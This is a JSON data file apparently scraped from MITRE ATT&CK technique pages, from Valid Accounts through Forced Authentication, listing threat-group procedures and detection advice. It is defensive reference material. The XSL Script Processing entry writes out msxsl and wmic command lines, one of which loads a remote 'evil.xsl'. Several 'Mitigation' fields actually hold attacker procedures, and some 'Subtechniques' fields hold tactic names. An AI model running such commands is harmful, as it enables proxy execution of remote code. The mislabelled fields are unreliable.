      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has used valid SSH credentials to access remote hosts.[39]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.[40][41]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments.[42]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has obtained valid accounts to gain initial access.[43][44]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit acquires valid SSH accounts through brute force. [45]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[46][47][48][49]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[50]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used compromised credentials to access other systems on a victim network.[51][52][15]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access.[53]"
      },
      {
        "id": "G0011",
        "name": "PittyTiger",
        "description": "PittyTiger attempts to obtain legitimate credentials during operations.[54]"
      },
      {
        "id": "G1005",
        "name": "POLONIUM",
        "description": "POLONIUM has used valid compromised credentials to gain access to victim environments.[55]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks.[56]"
      },
      {
        "id": "S0053",
        "name": "SeaDuke",
        "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[57]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used compromised credentials to log on to other systems and escalate privileges.[58]"
      },
      {
        "id": "G0122",
        "name": "Silent Librarian",
        "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.[59]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.[60][61][62]"
      },
      {
        "id": "G0039",
        "name": "Suckfly",
        "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[63]"
      },
      {
        "id": "G0088",
        "name": "TEMP.Veles",
        "description": "TEMP.Veles has used compromised VPN accounts.[64]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[65]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers.[66][67]"
      }
    ],
    "Detection": [
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Logon Session Metadata",
        "detects": "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      },
      {
        "id": "T1078.004",
        "name": "Cloud Accounts"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence, PrivilegeEscalation, InitialAccess"
  },
  {
    "Title": "Virtualization/Sandbox Evasion",
    "Code": "T1497",
    "Description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.[1]Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.[2]",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has the ability to perform anti-sandboxing and anti-virtualization checks.[3]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can attempt to overload sandbox analysis by sending 1550 calls to printf.[4]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal can check to determine if the compromised system is running on VMware.[5]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can make a random number of calls to the kernel32.beep function to hinder log analysis.[6]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee has the ability to perform anti-virtualization checks.[7]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.[8]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK  includes runtime checks to identify an analysis environment and prevent execution on it.[9]"
      },
      {
        "id": "S0046",
        "name": "CozyCar",
        "description": "Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.[10]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection.[11]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes.[12][13]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can use junk code to generate random activity to obscure malware behavior.[14]"
      },
      {
        "id": "S0499",
        "name": "Hancitor",
        "description": "Hancitor has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads.[15]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can sleep for a time interval between C2 communication attempts.[16]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution.[17]"
      },
      {
        "id": "C0005",
        "name": "Operation Spalax",
        "description": "During Operation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.[18]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon has the ability to use anti-detection functions to identify sandbox environments.[19]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can detect if it is running within a sandbox or other virtualized analysis environment.[20]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms.[21][22]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.[23]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may employ various means to detect and avoid virtualization and analysis environments. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1497.001",
        "name": "System Checks"
      },
      {
        "id": "T1497.002",
        "name": "User Activity Based Checks"
      },
      {
        "id": "T1497.003",
        "name": "Time Based Evasion"
      }
    ],
    "Tactic": "DefenseEvasion, Discovery"
  },
  {
    "Title": "Weaken Encryption",
    "Code": "T1600",
    "Description": "Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. [1]Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as Modify System Image, Reduce Key Space, and Disable Crypto Hardware, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. [2]",
    "Mitigation": "Mitigation table not found",
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "File Modification"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1600.001",
        "name": "Reduce Key Space"
      },
      {
        "id": "T1600.002",
        "name": "Disable Crypto Hardware"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "XSL Script Processing",
    "Code": "T1220",
    "Description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) [2] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4] Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5]Command-line examples:[3][5]msxsl.exe customers[.]xml script[.]xslmsxsl.exe script[.]xsl script[.]xslmsxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed \"Squiblytwo\", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.[6] This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.[5]Command-line examples:[5][6]Local File: wmic process list /FORMAT:evil[.]xslRemote File: wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\"",
    "Mitigation": [
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain. [7]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.[8]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa used an XSL file to run VBScript code.[9]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.[10]"
      }
    ],
    "Detection": [
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. [6] [11] Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded. The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Adversary-in-the-Middle",
    "Code": "T1557",
    "Description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.[1]For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.[2][3][4] Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.[5] Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.[6][7][8]Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.",
    "Mitigation": [
      {
        "id": "S0281",
        "name": "Dok",
        "description": "Dok proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.[9][10]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.[11]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor application logs for changes to settings and other events associated with network protocols and other services commonly abused for AiTM.[12]"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor network traffic for anomalies associated with known AiTM behavior."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Creation",
        "detects": "Monitor for newly constructed services/daemons through Windows event logs for event IDs 4697 and 7045. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as remote logins or process creation events."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient for changes to the \"EnableMulticast\" DWORD value. A value of \"0\" indicates LLMNR is disabled."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1557.001",
        "name": "LLMNR/NBT-NS Poisoning and SMB Relay"
      },
      {
        "id": "T1557.002",
        "name": "ARP Cache Poisoning"
      },
      {
        "id": "T1557.003",
        "name": "DHCP Spoofing"
      }
    ],
    "Tactic": "CredentialAccess, Collection"
  },
  {
    "Title": "Brute Force",
    "Code": "T1110",
    "Description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access.",
    "Mitigation": [
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts.[1]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 can perform brute force attacks to obtain credentials.[2][3][4]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.[5]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used Ncrack to reveal credentials.[6]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell has a module to perform brute force attacks on a system.[7]"
      },
      {
        "id": "S0220",
        "name": "Chaos",
        "description": "Chaos conducts brute force attacks against SSH services to gain initial access.[8]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can brute force supplied user credentials across a network range.[9]"
      },
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya used brute-force attack to obtain login data.[10]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has attempted to brute force credentials to gain access.[11]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.[12][13]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has brute forced RDP credentials.[14]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has used brute force attacks to compromise valid credentials.[15]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has attempted to brute force hosts over SSH.[16]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used brute force techniques to obtain credentials.[17]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group performed brute force attacks against administrator accounts.[18]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 has modules for brute forcing local administrator and AD user accounts.[19]"
      },
      {
        "id": "S0583",
        "name": "Pysa",
        "description": "Pysa has used brute force attempts against a central management console, as well as some Active Directory accounts.[20]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can conduct brute force attacks to capture credentials.[21][22][23]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords.[24]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1110.001",
        "name": "Password Guessing"
      },
      {
        "id": "T1110.002",
        "name": "Password Cracking"
      },
      {
        "id": "T1110.003",
        "name": "Password Spraying"
      },
      {
        "id": "T1110.004",
        "name": "Credential Stuffing"
      }
    ],
    "Tactic": "\nCredential Access"
  },
  {
    "Title": "Credentials from Password Stores",
    "Code": "T1555",
    "Description": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has the ability to steal credentials from FTP clients and wireless profiles.[1]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used a variety of publicly available tools like LaZagne to gather credentials.[2][3]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords.[4]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth uses an external software known as NetPass to recover passwords. [5]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp's passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients.[6]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke collects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys.[7]"
      },
      {
        "id": "G0120",
        "name": "Evilnum",
        "description": "Evilnum can collect email credentials from victims.[8]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.[9]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has run cmdkey on victim machines to identify stored credentials.[10]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY can collect credentials from WINSCP.[11]"
      },
      {
        "id": "S0349",
        "name": "LaZagne",
        "description": "LaZagne can obtain credentials from databases, mail, and WiFi across multiple platforms.[12]"
      },
      {
        "id": "G0077",
        "name": "Leafminer",
        "description": "Leafminer used several tools for retrieving login and password information, including LaZagne.[13]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients.[14]"
      },
      {
        "id": "S0167",
        "name": "Matryoshka",
        "description": "Matryoshka is capable of stealing Outlook passwords.[15][16]"
      },
      {
        "id": "S0002",
        "name": "Mimikatz",
        "description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.[17][18][19][20][21]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.[22][23][24]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can retrieve passwords from messaging and mail client applications.[25]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[26][27][28][29]"
      },
      {
        "id": "S0138",
        "name": "OLDBAIT",
        "description": "OLDBAIT collects credentials from several email clients.[30]"
      },
      {
        "id": "S0048",
        "name": "PinchDuke",
        "description": "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.[7]"
      },
      {
        "id": "S0435",
        "name": "PLEAD",
        "description": "PLEAD has the ability to steal saved passwords from Microsoft Outlook.[31]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can decrypt passwords stored in the RDCMan configuration file.[32]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "A module in Prikormka collects passwords stored in applications installed on the victim.[33]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can use Lazagne for harvesting credentials.[34]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can obtain passwords from common FTP clients.[35][36]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.[37]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.[38]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY.[39]"
      }
    ],
    "Detection": [
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Enumeration",
        "detects": "Monitor for API calls and CLI commands that attempt to enumerate and fetch credential material from cloud secrets managers, such as get-secret-value in AWS, gcloud secrets describe in GCP, and az key vault secret show in Azure. Alert on any suspicious usages of these commands, such as an account or service generating an unusually high number of secret requests."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for files being accessed that may search for common password storage locations to obtain user credentials."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may search for common password storage locations to obtain user credentials."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for processes being accessed that may search for common password storage locations to obtain user credentials."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may search for common password storage locations to obtain user credentials."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1555.001",
        "name": "Keychain"
      },
      {
        "id": "T1555.002",
        "name": "Securityd Memory"
      },
      {
        "id": "T1555.003",
        "name": "Credentials from Web Browsers"
      },
      {
        "id": "T1555.004",
        "name": "Windows Credential Manager"
      },
      {
        "id": "T1555.005",
        "name": "Password Managers"
      },
      {
        "id": "T1555.006",
        "name": "Cloud Secrets Management Stores"
      }
    ],
    "Tactic": "\nCredential Access"
  },
  {
    "Title": "Exploitation for Credential Access",
    "Code": "T1212",
    "Description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.[1][2] Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.[3][4][5]Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.[6]Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
    "Mitigation": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": "Application developers should consider taking measures to validate authentication requests by enabling one-time passwords, providing timestamps or sequence numbers for messages sent, using digital signatures, and/or using random session keys.[4][3]"
      },
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist.[7]"
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.[8] Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.[9] Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion."
      },
      {
        "id": "M1019",
        "name": "Threat Intelligence Program",
        "description": "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": "Update software regularly by employing patch management for internal enterprise endpoints and servers."
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for abnormal process creations, such as a Command and Scripting Interpreter spawning from a potentially exploited application. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen."
      }
    ],
    "Subtechniques": "\nCredential Access"
  },
  {
    "Title": "Forced Authentication",
    "Code": "T1187",
    "Description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. [1] This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. [2] [3]Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. [4] 